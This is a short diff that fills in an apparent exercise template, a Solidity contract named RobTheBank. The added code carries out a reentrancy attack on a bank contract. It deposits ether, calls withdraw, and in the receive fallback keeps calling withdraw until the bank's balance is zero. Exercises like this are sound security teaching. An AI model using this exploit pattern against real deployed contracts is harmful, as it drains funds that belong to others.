@@ -27,9 +27,16 @@ contract RobTheBank {
     
     function rob() public payable {
         // your code here
+      //bank.deposit{value: 1}();
+       (bool success, bytes memory data ) = address(bank).call{ value: msg.value }(abi.encodeWithSignature("deposit()"));
+      bank.withdraw();
     }
 
     receive() external payable {
         // your code here
+        while(address(bank).balance>0){
+            bank.withdraw();
+        }
+
     }
 }
